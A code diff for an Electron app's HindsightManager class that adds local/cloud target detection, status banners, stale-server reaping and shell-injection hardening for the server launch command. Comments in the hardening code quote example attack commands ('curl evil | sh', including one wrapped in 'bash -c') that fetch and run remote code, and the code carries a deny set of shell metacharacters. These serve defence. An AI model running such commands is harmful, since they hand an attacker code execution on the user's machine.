@@ -39,8 +39,32 @@ interface SettingsLike {
 
 const HEALTH_TIMEOUT_MS = 1000;       // match OllamaManager.checkIsRunning
 const AVAILABILITY_TTL_MS = 30_000;   // cache health so per-retain/recall calls are cheap
+const AUTH_FAILURE_TTL_MS = 5 * 60_000; // cache 401/403 longer — don't spam a rejected key
 const SPAWN_POLL_INTERVAL_MS = 5000;  // poll for readiness (like OllamaManager)
 const SPAWN_MAX_ATTEMPTS = 36;        // 36 * 5s = 180s (first boot downloads embedding models)
+const SYNTHETIC_LOCAL_BASEURL = 'http://localhost:8888'; // bundled dev server's default port
+
+/**
+ * Classify a baseUrl as local vs remote. Local targets get the auto-spawn + provider-key
+ * forwarding treatment; remote (Hindsight Cloud) targets are user-managed and authenticate
+ * with the Hindsight apiKey only. Treat localhost / loopback / mDNS (.local) as local.
+ * Anything else (including private LAN IPs and the public internet) is remote.
+ */
+function isLocalTarget(rawUrl: string | undefined | null): boolean {
+  if (!rawUrl) return true; // empty/undefined → assume local so the synthetic default works
+  try {
+    const u = new URL(rawUrl);
+    if (!['http:', 'https:'].includes(u.protocol)) return false;
+    const h = u.hostname.toLowerCase();
+    if (h === 'localhost' || h === '127.0.0.1' || h === '::1' || h === '0.0.0.0') return true;
+    if (h.endsWith('.local')) return true;
+    return false;
+  } catch {
+    // Unparseable URL → treat as local so the auto-spawn path can still surface an error
+    // via the spawn-failed banner rather than silently returning Noop.
+    return true;
+  }
+}
 
 export class HindsightManager {
   private static instance: HindsightManager | null = null;
@@ -52,12 +76,27 @@ export class HindsightManager {
   /** Cached health result + when it was taken. */
   private lastHealthy = false;
   private lastCheckedAt = 0;
+  /** Set to true the first time start() runs — gates isAvailable()'s cold-start optimism
+   *  so the very first recall doesn't fire a wasted 800ms probe before boot-time start()
+   *  has had a chance to spawn. See isAvailable(). */
+  private hasAttemptedStart = false;
+  /** Synchronous re-entry guard — true while a start() call is in flight (before any
+   *  await). Closed in finally. Prevents two concurrent start() calls from each passing
+   *  the serverProcess check (serverProcess isn't assigned until spawnServer returns,
+   *  which is after the first await). See start(). */
+  private pendingStart = false;
+  /** When the last healthCheck saw 401/403 — used to surface "Cloud key rejected" vs
+   *  "server not yet ready". Cleared on a successful response. Cached longer than
+   *  AVAILABILITY_TTL_MS (see AUTH_FAILURE_TTL_MS). */
+  private lastAuthFailedAt = 0;
   /** True only when WE spawned the server (so we kill it on quit). A user-run or Cloud
    *  server is never app-managed and is left running. */
   private isAppManaged = false;
   private serverProcess: ChildProcess | null = null;
   private pollInterval: NodeJS.Timeout | null = null;
   private spawnAttempts = 0;
+  /** Session-local enablement used by auto-start. Never persisted across crashes. */
+  private sessionMemoryOverride = false;
   /** Where the spawned server's stdout/stderr is written (for failure diagnostics). */
   private logPath: string | null = null;
 
@@ -72,21 +111,73 @@ export class HindsightManager {
   }
 
   /**
+   * Broadcast the current Hindsight lifecycle state to all renderer windows so the failure
+   * path is visible OUTSIDE the Settings panel (e.g. a persistent top-of-overlay banner).
+   * Without this, a spawn crash only logs to console + `<userData>/hindsight-server.log`,
+   * and the user has no idea anything went wrong unless they happen to have Settings open.
+   * `state` is one of: 'ready' | 'spawning' | 'unreachable' | 'spawn-failed' | 'auth-failed'.
+   * `reason` and `logPath` are optional context for the failure states. Never throws
+   * (best-effort).
+   */
+  private broadcastStatus(state: 'spawning' | 'ready' | 'unreachable' | 'spawn-failed' | 'auth-failed', reason?: string): void {
+    // Keep the availability cache consistent with the broadcast. A terminal failure state
+    // ('spawn-failed' / 'unreachable') means the server is NOT usable — pin lastHealthy
+    // false + stamp lastCheckedAt so isAvailable() returns the cached false instead of its
+    // optimistic-true cold-start path (which, after start() early-returns or a failed
+    // spawn, would otherwise fire a wasted 800ms recall probe per answer at a server we
+    // already know is down). 'spawning' leaves the cache alone (poll loop owns it).
+    if (state === 'spawn-failed' || state === 'unreachable') {
+      this.lastHealthy = false;
+      this.lastCheckedAt = Date.now();
+    }
+    try {
+      const { BrowserWindow } = require('electron') as typeof import('electron');
+      const payload = { state, reason: reason || undefined, logPath: this.logPath || undefined, at: Date.now() };
+      BrowserWindow.getAllWindows().forEach((win) => {
+        if (!win.isDestroyed()) {
+          win.webContents.send('hindsight-status', payload);
+        }
+      });
+    } catch (e: any) {
+      // Electron unavailable (headless / test) — log only, never block.
+      console.warn('[HindsightManager] broadcastStatus skipped (non-fatal):', e?.message);
+    }
+  }
+
+  /**
    * Resolve the Hindsight config: env (dev) takes precedence over the persisted setting
    * (packaged app). Returns null when no baseUrl is configured (→ feature off).
    */
   getHindsightConfig(): HindsightConfig | null {
     try {
       const s = this.settings();
+      // Explicit opt-out wins over everything else. A user who has flipped the "Don't use
+      // Hindsight" toggle is telling us to stay Noop, regardless of any inherited env or
+      // stale persisted URL. (See SettingsManager.AppSettings.hindsightExplicitlyDisabled.)
+      if (s?.get('hindsightExplicitlyDisabled') === true) return null;
       const baseUrl = (process.env.HINDSIGHT_BASE_URL
         || (s?.get('hindsightBaseUrl') as string | undefined)
         || '').trim();
-      if (!baseUrl) return null;
+      // NO-SAVE SYNTHETIC DEFAULT — when nothing is saved AND the user hasn't opted out,
+      // resolve to the bundled dev server's default port so boot-time start() reaches the
+      // auto-spawn branch. The `synthetic: true` flag lets the renderer label the URL as
+      // "(using local default)" without pretending the user actively chose it. The
+      // persisted setting stays empty until the user explicitly clicks Apply or Save —
+      // we never auto-write baseUrl on read.
+      if (!baseUrl) {
+        return {
+          baseUrl: SYNTHETIC_LOCAL_BASEURL,
+          apiKey: undefined,
+          timeoutMs: 800,
+          mode: 'local',
+          synthetic: true,
+        };
+      }
       const apiKey = (process.env.HINDSIGHT_API_KEY
         || (s?.get('hindsightApiKey') as string | undefined)
         || '').trim() || undefined;
       const timeoutMs = Number(process.env.HINDSIGHT_TIMEOUT_MS) || 800;
-      return { baseUrl, apiKey, timeoutMs };
+      return { baseUrl, apiKey, timeoutMs, mode: isLocalTarget(baseUrl) ? 'local' : 'cloud' };
     } catch {
       return null;
     }
@@ -113,7 +204,10 @@ export class HindsightManager {
     return this._localUserId;
   }
 
-  /** GET <baseUrl>/health with a 1s timeout. Returns false on any error/timeout. */
+  /** GET <baseUrl>/health with a 1s timeout. Returns false on any error/timeout.
+   *  401/403 is recorded separately via `lastAuthFailedAt` so callers can distinguish
+   *  "server not yet ready" from "Cloud key rejected" — the latter is a user-actionable
+   *  error and needs a different banner copy. */
   async healthCheck(): Promise<boolean> {
     const cfg = this.getHindsightConfig();
     if (!cfg) return false;
@@ -127,15 +221,50 @@ export class HindsightManager {
         headers,
       });
       clearTimeout(timer);
-      const ok = res.ok;
-      this.lastHealthy = ok;
+      this.lastHealthy = res.ok;
       this.lastCheckedAt = Date.now();
-      return ok;
+      // 401/403 → the endpoint is REACHABLE but auth is rejected. Cache this with a longer
+      // TTL than AVAILABILITY_TTL_MS so we don't spam the server with bad-token probes.
+      if (res.status === 401 || res.status === 403) {
+        this.lastAuthFailedAt = Date.now();
+        console.warn(`[HindsightManager] healthCheck returned ${res.status} — Cloud key may be rejected`);
+        return false;
+      }
+      // Clear any prior auth-failure cache on a non-auth response (2xx or 5xx — both mean
+      // "auth was accepted, the endpoint is reachable").
+      if (this.lastAuthFailedAt) {
+        this.lastAuthFailedAt = 0;
+        // The top-of-overlay banner only clears on explicit lifecycle events. Surface the
+        // recovery so the user gets immediate visual confirmation their fix worked. Fire
+        // the precise state: a 2xx → 'ready' (server is good); a 5xx → 'unreachable'
+        // (auth accepted but server erroring) so the banner copy + "View log" affordance
+        // matches reality instead of staying on the misleading "Cloud key rejected".
+        this.broadcastStatus(res.ok ? 'ready' : 'unreachable',
+          res.ok ? undefined : `server error (HTTP ${res.status})`);
+      }
+      return res.ok;
     } catch {
+      const wasAuthFailed = this.lastAuthFailedAt > 0;
       this.lastHealthy = false;
       this.lastCheckedAt = Date.now();
+      // A network error is categorically different from an auth rejection. Clear the
+      // auth-failure cache, otherwise `isAuthFailed()` keeps returning true for the full
+      // 5-min TTL and the user sees "Cloud key rejected" even when the real problem is
+      // "server unreachable". If we WERE showing the auth-failed banner, transition it to
+      // 'unreachable' so the stale red "Cloud key rejected" copy doesn't linger — the
+      // banner state machine only updates on broadcasts, never on its own.
+      if (wasAuthFailed) {
+        this.lastAuthFailedAt = 0;
+        this.broadcastStatus('unreachable', 'server unreachable');
+      }
       return false;
     }
+  }
+
+  /** True when the most recent healthCheck saw 401/403 within AUTH_FAILURE_TTL_MS. */
+  isAuthFailed(): boolean {
+    if (!this.lastAuthFailedAt) return false;
+    return Date.now() - this.lastAuthFailedAt < AUTH_FAILURE_TTL_MS;
   }
 
   /**
@@ -146,11 +275,22 @@ export class HindsightManager {
    */
   isAvailable(): boolean {
     if (!this.getHindsightConfig()) return false;
-    // Cold start: never health-checked yet (e.g. start() hasn't run / completed). Be
-    // OPTIMISTIC — return true and kick a check. Worst case is one recall to a down server
-    // (already timeout-bounded); the alternative (return false) would wrongly skip recall
-    // for a configured+healthy server on the first question after launch.
-    if (this.lastCheckedAt === 0) { void this.healthCheck(); return true; }
+    if (!this.memoryFlagOn()) return false;
+    // Cold start: never health-checked yet (e.g. start() hasn't even run). Returning true
+    // optimistically used to be safe — the server was assumed user-managed. Now that we
+    // auto-spawn on first launch, an optimistic true while start() is still mid-spawn
+    // (or has failed and broadcast spawn-failed) wastes a fetch per recall. Gate the
+    // optimistic true behind "start() has at least run once" — once it has, any recall
+    // can safely probe (the poll loop / user-manager assumption is established).
+    if (this.lastCheckedAt === 0) {
+      if (this.hasAttemptedStart) {
+        void this.healthCheck(); // re-probe in case the cache went cold (e.g. user reopened Settings)
+        return true;
+      }
+      // Boot-time, start() hasn't even been called yet. Return false — the first recall
+      // skips rather than wastes 800ms on a server that may not exist.
+      return false;
+    }
     const stale = Date.now() - this.lastCheckedAt > AVAILABILITY_TTL_MS;
     if (stale) { void this.healthCheck(); } // fire-and-forget refresh; never awaited here
     return this.lastHealthy;
@@ -159,8 +299,66 @@ export class HindsightManager {
   /** Is the memory feature flag enabled? (read fresh, never throws.) */
   private memoryFlagOn(): boolean {
     try {
+      if (this.sessionMemoryOverride) return true;
       const { isIntelligenceFlagEnabled } = require('../intelligence/intelligenceFlags');
       return Boolean(isIntelligenceFlagEnabled('hindsightMemory'));
+    } catch {
+      return this.sessionMemoryOverride;
+    }
+  }
+
+  /**
+   * Did the user opt into auto-starting the companion server? Hotfix 2026-07-09:
+   * default OFF. Zero-config default-on spawned heavy dev/source sidecars and made
+   * crash recovery fragile; users can still enable it explicitly in settings/env.
+   */
+  private isAutoStartEnabled(): boolean {
+    try {
+      const s = this.settings();
+      return (s?.get('hindsightAutoStart') as boolean | undefined) ?? false;
+    } catch {
+      return false;
+    }
+  }
+
+  /**
+   * True when the user (or env override) has explicitly disabled `hindsightMemory` — value
+   * differs from the registry default. Read via the sibling setting key
+   * `hindsightMemoryEnabledExplicit`, which `setIntelligenceFlag` writes whenever the
+   * persisted value !== registry default. Without this guard the auto-flip would silently
+   * re-enable a flag the user explicitly turned off — and the Customize disclosure hides
+   * the Hindsight flags, so there's no UI to re-disable from. Never throws.
+   */
+  private hindsightMemoryExplicitlyOff(): boolean {
+    try {
+      const s = this.settings();
+      // The sibling is set to `true` only when the value DIFFERS from default. If the
+      // user explicitly set it OFF (default is OFF), the sibling is true.
+      if (s?.get('hindsightMemoryEnabledExplicit') === true) {
+        // Cross-check with the actual flag value — covers the edge case where a user
+        // wrote `hindsightMemoryEnabledExplicit=true` but the value matches default
+        // (defensive: shouldn't happen given setIntelligenceFlag's invariant, but cheap).
+        const { isIntelligenceFlagEnabled } = require('../intelligence/intelligenceFlags');
+        return !isIntelligenceFlagEnabled('hindsightMemory');
+      }
+      return false;
+    } catch {
+      return false;
+    }
+  }
+
+  /**
+   * True when the `hindsightMemory` flag is FORCED by an env override
+   * (`NATIVELY_HINDSIGHT_MEMORY` set to a recognized on/off value). Env writes no
+   * SettingsManager state, so `hindsightMemoryExplicitlyOff()` can't see it — this
+   * helper covers the gap. The auto-flip must skip when the env forces the value in
+   * EITHER direction: forcing OFF must not be silently overwritten with a persisted ON,
+   * and forcing ON means the flip is already unnecessary. Never throws.
+   */
+  private memoryFlagEnvForced(): boolean {
+    try {
+      const { isIntelligenceFlagEnvForced } = require('../intelligence/intelligenceFlags');
+      return Boolean(isIntelligenceFlagEnvForced('hindsightMemory'));
     } catch {
       return false;
     }
@@ -230,12 +428,21 @@ export class HindsightManager {
   private autoStartCommand(): string | null {
     try {
       const s = this.settings();
-      // Default ON (auto-start-when-installed, per the design) unless explicitly disabled.
-      const autoStart = (s?.get('hindsightAutoStart') as boolean | undefined) ?? true;
-      if (!autoStart) return null;
       const explicit = (process.env.HINDSIGHT_SERVER_COMMAND
         || (s?.get('hindsightServerCommand') as string | undefined)
         || '').trim();
+      // Default OFF for stability: auto-starting a heavy local Python/Postgres
+      // sidecar should be an explicit opt-in. An explicit launch command counts
+      // as opt-in unless the user explicitly disabled auto-start.
+      const autoStartSetting = s?.get('hindsightAutoStart') as boolean | undefined;
+      if (autoStartSetting === false) return null;
+      if (autoStartSetting !== true && !explicit) return null;
+      // CLOUD GUARD — Hindsight Cloud is user-managed (lives at a remote URL). We never try
+      // to `bash scripts/...` against a remote URL — that would launch a local Python server
+      // and ignore the configured Cloud target. The user is responsible for the Cloud
+      // endpoint being healthy; the app only health-checks it.
+      const cfg = this.getHindsightConfig();
+      if (cfg && !isLocalTarget(cfg.baseUrl)) return null;
       if (explicit) return explicit;
       // Zero-config fallback: run the bundled launcher IFF it exists on disk. Quote the path
       // (it's absolute and may contain spaces, e.g. "/Users/.../Application Support/...").
@@ -297,14 +504,68 @@ export class HindsightManager {
    */
   async start(): Promise<void> {
     try {
+      this.hasAttemptedStart = true;
+      // IDEMPOTENT RE-ENTRY GUARD — start() is called from BOTH boot (main.ts:996) AND
+      // on every debounced setHindsightConfig IPC (every field edit). We use a SYNCHRONOUS
+      // pendingStart flag (set before any await) so two start() calls landing within the
+      // same microtask — before serverProcess is assigned inside spawnServer() — still
+      // bail out cleanly. The serverProcess check alone is racy: between start()'s
+      // `await healthCheck()` yielding and spawnServer() returning, a second start()
+      // would see serverProcess===null and proceed to a second spawnServer() → two
+      // children both binding port 8888. The pendingStart boolean closes that window.
+      if (this.serverProcess || this.pendingStart) return;
+      this.pendingStart = true;
+      this.reapPreviousManagedServer();
       const cfg = this.getHindsightConfig();
       if (!cfg) return;                 // no baseUrl → feature off, stay Noop
-      if (!this.memoryFlagOn()) return; // flag off → don't manage anything
+      // SELF-HEALING AUTO-FLIP — `hindsightMemory` is default-OFF in the flag registry
+      // (electron/intelligence/intelligenceFlags.ts:142), so a user with a baseUrl
+      // configured + autoStart ON + the companion installed would still hit the
+      // `memoryFlagOn()` guard below and never spawn. The UI's autoStart toggle is
+      // INDEPENDENT of the flag — it only gates `autoStartCommand()` resolution, not
+      // the spawn gate. When the user has opted into auto-start, treat the request as
+      // "enable memory for this session": idempotently flip the flag ON here so the
+      // gate passes.
+      //
+      // RESPECT USER-OFF INTENT — two independent ways the user can say "off", both of
+      // which the auto-flip must honor:
+      //   (1) UI/settings: `setIntelligenceFlag` writes the sibling
+      //       `hindsightMemoryEnabledExplicit=true` whenever the value DIFFERS from the
+      //       registry default → `hindsightMemoryExplicitlyOff()` returns true → skip.
+      //   (2) Env override: `NATIVELY_HINDSIGHT_MEMORY=0` writes NO SettingsManager state,
+      //       so the sibling check alone can't see it. `isIntelligenceFlagEnvForced`
+      //       detects it. CRITICAL: without this, the auto-flip would write
+      //       `hindsightMemoryEnabled=true` to settings while env=0 wins at read time —
+      //       looks fine until the user unsets the env, at which point memory silently
+      //       turns ON against the user's stated "always off" intent.
+      // Either signal blocks the flip. The Customize disclosure intentionally HIDES the
+      // Hindsight flags, so a wrong flip leaves the user no UI to re-disable.
+      if (
+        !this.memoryFlagOn() &&
+        this.isAutoStartEnabled() &&
+        !this.hindsightMemoryExplicitlyOff() &&
+        !this.memoryFlagEnvForced()
+      ) {
+        // Hotfix 2026-07-09: do not persistently flip hindsightMemory just
+        // because autoStart is enabled. A crash after a persisted flip made the
+        // heavy sidecar come back forever with no UI escape hatch. Keep the
+        // enablement process-local for this launch only.
+        this.sessionMemoryOverride = true;
+        console.log('[HindsightManager] session-enabling hindsightMemory (autoStart ON, baseUrl configured).');
+      }
+      if (!this.memoryFlagOn()) return; // still off (autoStart explicitly disabled) → don't manage anything
 
       const healthy = await this.healthCheck();
       if (healthy) {
-        console.log('[HindsightManager] server already running — connecting (not app-managed).', { baseUrl: cfg.baseUrl });
-        this.isAppManaged = false;
+        // CRITICAL: only declare "not app-managed" if we weren't the ones who spawned it.
+        // A second start() (from a debounced auto-save) hitting the healthy branch used
+        // to clobber isAppManaged = false unconditionally → stopSync() short-circuited →
+        // the spawned Python+Postgres tree was orphaned on quit AND held port 8888
+        // forever, blocking auto-spawn on next launch.
+        if (!this.isAppManaged) {
+          console.log('[HindsightManager] server already running — connecting (not app-managed).', { baseUrl: cfg.baseUrl });
+          this.broadcastStatus('ready');
+        }
         return;
       }
 
@@ -315,10 +576,17 @@ export class HindsightManager {
       }
 
       console.log('[HindsightManager] server not detected — auto-starting:', cmd);
+      this.broadcastStatus('spawning');
       this.spawnServer(cmd);
       this.pollUntilReady();
     } catch (e: any) {
       console.warn('[HindsightManager] start skipped (non-fatal):', e?.message);
+    } finally {
+      // Always release the pendingStart guard, regardless of which branch (auto-flip
+      // rejection, cfg-null, memoryFlagOn, no-cmd, healthy, spawned, throw) we exit
+      // through. Without this the guard would never release on early-returns and
+      // every subsequent start() would silently no-op.
+      this.pendingStart = false;
     }
   }
 
@@ -367,8 +635,14 @@ export class HindsightManager {
         // Prefer the explicit LiteLLM key; fall back to the OpenAI key already set above.
         const litellmKey = cm.getLitellmApiKey();
         if (litellmKey) extra.OPENAI_API_KEY = litellmKey;
-        // Guard: if neither key is present, litellm still needs a non-empty string.
-        if (!extra.OPENAI_API_KEY) extra.OPENAI_API_KEY = 'natively-gateway';
+        // Guard: if neither key is present, litellm still needs a non-empty string. The
+        // placeholder 'natively-gateway' satisfies litellm's non-empty check but WILL
+        // 401 against any auth-required LiteLLM proxy (the common case). Log so the
+        // operator has a trail when retains/reflects silently fail.
+        if (!extra.OPENAI_API_KEY) {
+          extra.OPENAI_API_KEY = 'natively-gateway';
+          console.warn('[HindsightManager] LiteLLM URL configured without an API key — using placeholder. Retains/reflects will likely fail on auth-required proxies. Save an OpenAI or LiteLLM key in AI Providers.');
+        }
       }
 
       // Ollama — no API key; signal availability via the enable flag and pass the base URL.
@@ -419,6 +693,67 @@ export class HindsightManager {
     }
   }
 
+  /**
+   * Public accessor for the absolute server-log path. Used by the `open-hindsight-log` IPC
+   * so the banner's "View log" button can hand the file to shell.openPath. Returns the
+   * cached `logPath` if a spawn already populated it, else re-resolves from scratch (so
+   * the path is available BEFORE the first spawn — useful for surfacing where the log
+   * WOULD go to a curious user).
+   */
+  getServerLogPath(): string | null {
+    return this.logPath ?? this.resolveServerLogPath();
+  }
+
+  private resolveManagedPidPath(): string | null {
+    try {
+      const path = require('path') as typeof import('path');
+      const { app } = require('electron') as typeof import('electron');
+      const userData = app?.getPath?.('userData');
+      return userData ? path.join(userData, 'hindsight-managed-server.pid') : null;
+    } catch {
+      return null;
+    }
+  }
+
+  private writeManagedPid(pid: number): void {
+    try {
+      const pidPath = this.resolveManagedPidPath();
+      if (!pidPath) return;
+      const fs = require('fs') as typeof import('fs');
+      fs.writeFileSync(pidPath, `${pid}\n`, 'utf8');
+    } catch { /* best-effort */ }
+  }
+
+  private clearManagedPid(): void {
+    try {
+      const pidPath = this.resolveManagedPidPath();
+      if (!pidPath) return;
+      const fs = require('fs') as typeof import('fs');
+      if (fs.existsSync(pidPath)) fs.unlinkSync(pidPath);
+    } catch { /* best-effort */ }
+  }
+
+  private reapPreviousManagedServer(): void {
+    try {
+      const pidPath = this.resolveManagedPidPath();
+      if (!pidPath) return;
+      const fs = require('fs') as typeof import('fs');
+      if (!fs.existsSync(pidPath)) return;
+      const pid = Number(fs.readFileSync(pidPath, 'utf8').trim());
+      fs.unlinkSync(pidPath);
+      if (!Number.isFinite(pid) || pid <= 0) return;
+      try {
+        if (process.platform !== 'win32') process.kill(-pid, 'SIGKILL');
+        else require('child_process').execFileSync('taskkill', ['/pid', String(pid), '/T', '/F'], { stdio: 'ignore' });
+        console.warn(`[HindsightManager] reaped stale app-managed server process group from previous launch (pid=${pid}).`);
+      } catch {
+        try { process.kill(pid, 'SIGKILL'); } catch { /* already gone */ }
+      }
+    } catch (e: any) {
+      console.warn('[HindsightManager] stale-server reaper skipped (non-fatal):', e?.message);
+    }
+  }
+
   /** On a non-zero server exit, tail the captured log into the app log so the failure cause
    *  (missing module, bad key, port in use) is visible instead of a bare exit code. */
   private logServerFailureTail(): void {
@@ -436,11 +771,79 @@ export class HindsightManager {
 
   /** Spawn the configured server command (shell form, like `bash scripts/hindsight-start.sh`).
    *  Degrades gracefully on error ("python/script not found") — app unaffected. */
+  /**
+   * Parse a command string into argv WITHOUT a shell — handles double-quoted segments
+   * (for the bundled launcher path which may contain spaces, e.g. "Application Support")
+   * and rejects shell metacharacters that would enable injection. Returns null when the
+   * command contains metacharacters outside quotes (caller must refuse to spawn unless
+   * HINDSIGHT_SERVER_COMMAND_ALLOW_SHELL is set). Supports the two real forms:
+   *   • `bash "/abs path/scripts/hindsight-start.sh"`  → ['bash', '/abs path/.../start.sh']
+   *   • `my-launcher --foo bar`                        → ['my-launcher', '--foo', 'bar']
+   * Rejects `bash x; curl evil | sh`, `$(...)`, backticks, `&&`, `|`, `>`, `<`, newlines.
+   */
+  private parseCommandToArgv(command: string): string[] | null {
+    // Reject obvious shell metacharacters anywhere outside of double quotes. We scan
+    // char-by-char tracking quote state; a metachar seen while NOT inside quotes → reject.
+    const META = new Set([';', '|', '&', '$', '`', '>', '<', '(', ')', '\n', '\r', '{', '}', '*', '?', '~', '!', '#', '\\']);
+    const argv: string[] = [];
+    let cur = '';
+    let inQuote = false;
+    let sawToken = false;
+    for (let i = 0; i < command.length; i++) {
+      const c = command[i];
+      if (inQuote) {
+        if (c === '"') { inQuote = false; }
+        else { cur += c; }
+        continue;
+      }
+      if (c === '"') { inQuote = true; sawToken = true; continue; }
+      if (c === ' ' || c === '\t') {
+        if (sawToken) { argv.push(cur); cur = ''; sawToken = false; }
+        continue;
+      }
+      if (META.has(c)) return null; // metachar outside quotes → unsafe
+      cur += c; sawToken = true;
+    }
+    if (inQuote) return null;          // unterminated quote → malformed
+    if (sawToken) argv.push(cur);
+    if (!argv.length) return null;
+    // CRITICAL — `bash -c "curl evil | sh"` parses cleanly above (all metacharacters
+    // are inside quotes) but `bash -c` is itself a shell-execution vector. The parser's
+    // metachar scan can't catch it because the shell interprets `-c` as a flag, not a
+    // character. Allowlist argv[0] to a known-safe set: the bundled bash launcher,
+    // node/python for hypothetical custom launchers. ANY other binary → reject. The
+    // bundled auto-spawn path uses `bash <abs path>/hindsight-start.sh` which passes.
+    const SAFE_BINARIES = new Set(['bash', 'sh', 'node', 'python', 'python3']);
+    const base = (argv[0].split(/[\\/]/).pop() || '').toLowerCase();
+    if (!SAFE_BINARIES.has(base)) return null;
+    // Also reject `bash -c <command>` and `bash -lc <command>` explicitly — even
+    // though bash itself is allowlisted, `-c`/`-lc` allow arbitrary command execution
+    // and defeat the argv scan. Reject any argv[1] starting with `-c` or `-l`.
+    if (argv[1] && (argv[1] === '-c' || argv[1] === '-lc' || argv[1].startsWith('-c') || argv[1].startsWith('-lc'))) return null;
+    return argv;
+  }
+
   private spawnServer(command: string): void {
     try {
       const { spawn } = require('child_process') as typeof import('child_process');
+      // SHELL-INJECTION HARDENING — `command` can come from a persisted
+      // `hindsightServerCommand` setting (writable by any code that can reach
+      // SettingsManager). Running it via `shell: true` would execute embedded
+      // metacharacters (`bash x; curl evil | sh`) on every auto-start → RCE on launch.
+      // Default: parse into argv and spawn with shell:false (no shell interpretation).
+      // Escape hatch: HINDSIGHT_SERVER_COMMAND_ALLOW_SHELL=true restores the legacy
+      // shell behavior for power users who genuinely need a shell one-liner.
+      const allowShell = String(process.env.HINDSIGHT_SERVER_COMMAND_ALLOW_SHELL || '').toLowerCase() === 'true';
+      let argv: string[] | null = null;
+      if (!allowShell) {
+        argv = this.parseCommandToArgv(command);
+        if (!argv) {
+          console.error('[HindsightManager] refusing to spawn — command contains shell metacharacters and HINDSIGHT_SERVER_COMMAND_ALLOW_SHELL is not set:', command);
+          this.broadcastStatus('spawn-failed', 'launch command rejected (contains shell metacharacters)');
+          return;
+        }
+      }
       this.isAppManaged = true;
-      // Shell form so a multi-token command (`bash scripts/...`) works cross-platform.
       // detached:true on POSIX puts the server in its OWN process group, so on quit we can
       // synchronously kill the WHOLE tree (Python + embedded Postgres workers, which
       // re-parent/daemonize) with one `process.kill(-pid)` inside before-quit — tree-kill
@@ -473,8 +876,14 @@ export class HindsightManager {
       } catch { outFd = null; }
       const stdio: any = outFd !== null ? ['ignore', outFd, outFd] : 'ignore';
 
-      this.serverProcess = spawn(command, {
-        shell: true,
+      // CLOUD GUARD — when the user is on Hindsight Cloud, skip buildCredentialEnv(): Cloud
+      // authenticates with the Hindsight apiKey (already in process.env via HINDSIGHT_API_KEY),
+      // not litellm provider keys. Forwarding Gemini/OpenAI/etc. into a Cloud-authenticated
+      // process leaks user credentials into a server the user does not own.
+      const cfg = this.getHindsightConfig();
+      const credsEnv = (cfg && !isLocalTarget(cfg.baseUrl)) ? {} : this.buildCredentialEnv();
+
+      const spawnOpts = {
         detached: !isWin,   // own process group on POSIX for group-kill on quit
         windowsHide: true,
         stdio,
@@ -483,28 +892,52 @@ export class HindsightManager {
         // packaged app doesn't need .env or manual GEMINI_API_KEY exports. The shell
         // script (hindsight-start.sh) picks these up and builds the litellm router.
         // augmentPath() fixes the Finder-launch minimal-PATH caveat (python3 not found).
-        env: { ...process.env, PATH: this.augmentPath(), ...this.buildCredentialEnv() },
-      });
+        env: { ...process.env, PATH: this.augmentPath(), ...credsEnv },
+      };
+      this.serverProcess = allowShell
+        // Legacy shell form (opt-in via HINDSIGHT_SERVER_COMMAND_ALLOW_SHELL=true).
+        ? spawn(command, { ...spawnOpts, shell: true })
+        // Default safe form — argv[0] + args, NO shell interpretation. argv is non-null
+        // here (we returned early above if parseCommandToArgv failed).
+        : spawn(argv![0], argv!.slice(1), { ...spawnOpts, shell: false });
       // The parent no longer needs the fd once the child owns it.
       if (outFd !== null) { try { require('fs').closeSync(outFd); } catch { /* noop */ } }
+      // Persist the app-managed root PID so the next launch can reap the process
+      // group if this Electron process dies before before-quit/stopSync runs.
+      if (this.serverProcess.pid) this.writeManagedPid(this.serverProcess.pid);
       // Don't let the detached child keep the parent event loop alive.
       this.serverProcess.unref?.();
       this.serverProcess.on('error', (err: any) => {
         console.error('[HindsightManager] failed to start server (is it installed?):', err?.message);
+        this.clearManagedPid();
         this.isAppManaged = false;
         this.serverProcess = null;
         if (this.pollInterval) { clearInterval(this.pollInterval); this.pollInterval = null; }
+        // Surface to the renderer — a top-of-overlay banner will read this and offer "View log".
+        this.broadcastStatus('spawn-failed', `failed to start server: ${err?.message || 'unknown error'}`);
       });
       this.serverProcess.on('close', (code: number | null) => {
         console.log('[HindsightManager] server process exited', { code });
         // A non-zero exit before readiness means the launcher failed — surface the tail of its
         // log so the reason is visible in the app log instead of a bare exit code.
-        if (code && code !== 0) this.logServerFailureTail();
+        const failed = code !== null && code !== 0;
+        if (failed) {
+          this.logServerFailureTail();
+          // Only surface the broadcast if a spawn was in flight (i.e. we polled for readiness).
+          // A user-initiated stopSync() clears isAppManaged BEFORE the close fires, so the
+          // conditional prevents a spurious "spawn failed" banner when the user quit normally.
+          if (this.isAppManaged) {
+            this.broadcastStatus('spawn-failed', `server exited with code ${code}`);
+          }
+        }
+        this.clearManagedPid();
         this.serverProcess = null;
       });
     } catch (e: any) {
       console.error('[HindsightManager] exception spawning server:', e?.message);
+      this.clearManagedPid();
       this.isAppManaged = false;
+      this.broadcastStatus('spawn-failed', `spawn exception: ${e?.message || 'unknown error'}`);
     }
   }
 
@@ -515,16 +948,26 @@ export class HindsightManager {
     if (this.pollInterval) { clearInterval(this.pollInterval); this.pollInterval = null; }
     this.spawnAttempts = 0;
     this.pollInterval = setInterval(async () => {
+      // Stop polling immediately if the spawned process has exited (the 'close' handler
+      // nulls serverProcess). Before this fix, the loop kept hammering a dead port for
+      // the full 180s after a fast-fail spawn (e.g. "No module named 'hindsight'").
+      if (!this.serverProcess) {
+        if (this.pollInterval) { clearInterval(this.pollInterval); this.pollInterval = null; }
+        return;
+      }
       this.spawnAttempts++;
       const healthy = await this.healthCheck();
       if (healthy) {
         console.log(`[HindsightManager] server ready after ~${this.spawnAttempts * 5}s`);
         if (this.pollInterval) { clearInterval(this.pollInterval); this.pollInterval = null; }
+        this.broadcastStatus('ready');
         return;
       }
       if (this.spawnAttempts >= SPAWN_MAX_ATTEMPTS) {
         console.warn('[HindsightManager] timeout waiting for server — staying Noop. Check the install / command.');
         if (this.pollInterval) { clearInterval(this.pollInterval); this.pollInterval = null; }
+        this.logServerFailureTail();
+        this.broadcastStatus('unreachable', `server did not respond within ${SPAWN_MAX_ATTEMPTS * SPAWN_POLL_INTERVAL_MS / 1000}s — check the install / command`);
       }
     }, SPAWN_POLL_INTERVAL_MS);
     this.pollInterval.unref?.(); // never keep the process alive for this
@@ -552,6 +995,7 @@ export class HindsightManager {
         try { process.kill(-pid, 'SIGKILL'); }
         catch { try { process.kill(pid, 'SIGKILL'); } catch { /* gone */ } }
       }
+      this.clearManagedPid();
       this.serverProcess = null;
       this.isAppManaged = false;
